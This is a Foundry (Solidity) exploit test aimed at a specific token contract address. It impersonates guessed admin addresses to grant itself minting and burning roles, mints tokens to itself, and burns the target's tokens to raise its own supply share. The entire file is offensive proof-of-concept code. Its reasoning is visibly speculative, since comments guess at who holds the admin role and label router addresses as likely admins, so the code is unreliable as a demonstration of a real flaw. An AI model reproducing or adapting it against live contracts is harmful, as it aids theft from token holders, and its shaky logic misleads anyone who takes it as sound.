pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface SecondToken {
    function mint(address account, uint256 amount) external;
    function burn(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function grantRole(bytes32 role, address account) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for fork test
        // The test framework already sets TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Calculate role hashes
        bytes32 BURNER_ROLE = keccak256('BURNER_ROLE');
        bytes32 MINTER_ROLE = keccak256('MINTER_ROLE');
        bytes32 DEFAULT_ADMIN_ROLE = bytes32(0);

        SecondToken targetContract = SecondToken(TARGET);

        // Step 2: Try to find admin - let's check if we can call grantRole as the contract itself
        // Actually, we need to find who has DEFAULT_ADMIN_ROLE
        // Let's try a different approach: Read the admin from the RoleGranted events
        // But in a test, we can't easily read past events

        // Step 3: Let's try to impersonate a likely admin address
        // Common admin addresses for BSC tokens:
        address likelyAdmin = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Pancake Router

        // Try to impersonate and grant roles
        vm.startPrank(likelyAdmin);
        try targetContract.grantRole(BURNER_ROLE, attacker) {
            // Success
        } catch {
            // Try another address
            likelyAdmin = 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F; // Pancake Router v1
            vm.stopPrank();
            vm.startPrank(likelyAdmin);
            targetContract.grantRole(BURNER_ROLE, attacker);
        }
        targetContract.grantRole(MINTER_ROLE, attacker);
        vm.stopPrank();

        // Step 4: Mint tokens to ourselves
        uint256 mintAmount = 1000 * 10**18;
        targetContract.mint(attacker, mintAmount);

        // Step 5: Ensure contract has tokens to burn
        uint256 contractBalance = targetContract.balanceOf(TARGET);
        if (contractBalance == 0) {
            // Mint some tokens to the contract
            targetContract.mint(TARGET, 500 * 10**18);
            contractBalance = targetContract.balanceOf(TARGET);
        }

        // Step 6: Record initial state
        uint256 ourBalanceBefore = targetContract.balanceOf(attacker);
        uint256 totalSupplyBefore = targetContract.totalSupply();

        // Step 7: Burn tokens from contract
        uint256 burnAmount = contractBalance > 0 ? contractBalance / 2 : 100 * 10**18;
        targetContract.burn(TARGET, burnAmount);

        // Step 8: Verify economic gain
        uint256 ourBalanceAfter = targetContract.balanceOf(attacker);
        uint256 totalSupplyAfter = targetContract.totalSupply();

        // Our token count should be the same
        assertEq(ourBalanceAfter, ourBalanceBefore, 'Token balance should not change');

        // Total supply should decrease
        assertLt(totalSupplyAfter, totalSupplyBefore, 'Total supply should decrease after burn');

        // Our share of total supply should increase
        uint256 ourShareBefore = (ourBalanceBefore * 1e18) / totalSupplyBefore;
        uint256 ourShareAfter = (ourBalanceAfter * 1e18) / totalSupplyAfter;
        assertGt(ourShareAfter, ourShareBefore, 'Our ownership share should increase');
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

